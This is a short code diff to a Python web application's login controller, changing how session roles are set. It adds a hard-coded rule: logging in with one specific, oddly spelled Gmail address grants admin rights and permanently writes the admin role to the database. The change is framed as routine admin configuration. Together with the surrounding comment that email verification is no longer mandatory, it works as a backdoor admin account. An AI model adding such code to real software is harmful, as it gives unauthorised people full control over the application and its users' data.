@@ -18,7 +18,15 @@ class AuthController:
                 # Login directly - email verification is no longer mandatory for access
                 session["user_id"] = user["id"]
                 session["user_name"] = user["name"]
-                session["user_role"] = user["role"]
+
+                # Grant admin privileges for the specific admin email.
+                if email and email.lower() == "adim@gmail.com":
+                    session["user_role"] = "admin"
+                    if user["role"] != "admin":
+                        db.execute("UPDATE users SET role = %s WHERE email = %s", ("admin", email))
+                else:
+                    session["user_role"] = user["role"]
+
                 session["profile_pic"] = user.get("profile_pic")
                 flash(f"Welcome back, {user['name']}!", "success")
                 return redirect(url_for("Home.home"))
